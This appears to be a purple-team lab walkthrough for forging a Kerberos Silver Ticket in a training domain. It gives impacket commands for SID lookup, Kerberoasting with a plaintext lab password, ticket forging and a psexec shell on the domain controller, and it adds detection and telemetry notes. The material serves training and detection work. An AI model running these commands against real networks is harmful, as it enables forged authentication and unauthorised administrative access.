# WT#011 — Silver Ticket

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | Any service — e.g., CIFS on dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **Starting Credential** | Service account NTLM hash (from Kerberoast — WT#002 — or DCSync — WT#009) |
| **Tools Required** | impacket-ticketer, impacket-psexec |
| **Certifications** | CRTP, CRTE |
| **MITRE ATT&CK** | T1558.002 |
| **Difficulty** | Medium |

## Prerequisites

- NTLM hash of a service account or machine account (e.g., `dc01$` or `chief_command`)
- Domain SID of `cadre.local`
- Target service SPN (e.g., `cifs/dc01.cadre.local`)

## Attack Steps

### Step 1: Gather prerequisites

```bash
# Extract domain SID
impacket-lookupsid cadre.local/analyst_dfir:'An@lyst_DF1R!'@192.168.77.10 | grep "Domain Sid"

# Extract service hash (if not already obtained)
impacket-GetUserSPNs cadre.local/analyst_dfir:'An@lyst_DF1R!' -dc-ip 192.168.77.10 -request
```

### Step 2: Exploit — Forge a Silver Ticket

```bash
impacket-ticketer -nthash <Service_NTLM_Hash> -domain-sid <S-1-5-21-DOMAIN_SID> -domain cadre.local -spn cifs/dc01.cadre.local -user-id 500 Administrator
```

### Step 3: Verify — Access the target service

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass cadre.local/Administrator@dc01.cadre.local
```

## Post-Exploitation Chain

- **Forged TGS valid for the target service** (up to `MaxServiceTicketAge`)
- **Access specific service** without contacting a DC (no TGS request — no audit log)
- **CIFS silver ticket** → SMB access to the target machine
- **HOST silver ticket** → Scheduled task creation
- **LDAP silver ticket** → Domain enumeration
- **HTTP silver ticket** → IIS/WebDAV access

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** No native Kerberos event is generated for forged TGS usage (the DC is never contacted). Detection requires:
  - Network-level Kerberos traffic analysis (Zeek `kerberos.log` — rule `cadre-007-zeek-kerberoast`)
  - Service-level anomalies (e.g., SMB access from unusual source without corresponding TGS request)
- **Expected Event:** None at the DC level — detection relies on the target service's authentication logs (Event ID 4624) and network traffic analysis

## Status

POST-EXPLOIT
